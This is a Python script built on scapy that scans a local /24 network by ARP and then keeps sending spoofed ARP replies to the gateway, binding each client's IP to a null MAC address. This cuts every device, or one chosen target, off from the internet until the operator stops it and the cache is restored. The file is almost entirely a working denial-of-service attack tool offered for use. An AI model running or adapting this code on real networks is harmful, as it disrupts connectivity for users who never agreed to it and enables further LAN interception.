#!/usr/bin/env python
import sys
from scapy.all import ARP, Ether, srp, send

usage = f"""
Usage: {sys.argv[0]} <gateway> <target: optional>

    gateway:\trepresents the gateway's ip
    target:\trepresents the target's ip. will attack every target in the network

"""

def arp_scan(gateway, target=None):
    # IP Address for the destination
    target_ip = gateway+"/24" if target == None else [gateway, target]

    # create ARP packet
    arp = ARP(pdst=target_ip)

    # create the Ether broadcast packet
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")


    # stack them
    packet = ether/arp

    result = srp(packet, timeout=3)[0]

    clients = []
    for sent, received in result:
        clients.append({'ip': received.psrc, 'mac': received.hwsrc})

    return clients

def spoofarpcache(targetip, targetmac, sourceip):
	spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac, hwsrc='00:00:00:00:00:00')
	send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
	packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
	send(packet, verbose=False)

def shut_internet(gateway, targets):
    ghost_ip = '192.168.1.254'

    gateway_mac = list(filter(lambda x: x['ip'] == gateway, targets))[0]['mac']
    clients = list(filter(lambda x: x['ip'] != gateway, targets))

    try:
        while True:
            for client in clients:
                print("[+] Poisoning router's arp cache for "+client['ip'])
                spoofarpcache(gateway, gateway_mac, client['ip'])
    except KeyboardInterrupt:
        for client in clients:
            print(f"\n[!] Stopping and restoring arp cache for {client['ip']}")
            restorearp(gateway, gateway_mac, client['ip'], client['mac'])
            print("[+] Done.")
        sys.exit(1)


def main(gateway, target=None):
    print("[+] Starting arp scan...")
    targets = arp_scan(gateway, target)
    print("[+] Arp scan done.")
    print(f"[+] {len(targets)-1} clients found!")
    print("[+] Starting shut the internet down...\n")
    shut_internet(gateway, targets)

if __name__=='__main__':
    if len(sys.argv) == 2:
        main(sys.argv[1])
    elif len(sys.argv) == 3:
        main(sys.argv[1], sys.argv[2])
    else:
        print(usage)
        print("[!] Gateway was not provided! Exiting...")

        sys.exit(1)
    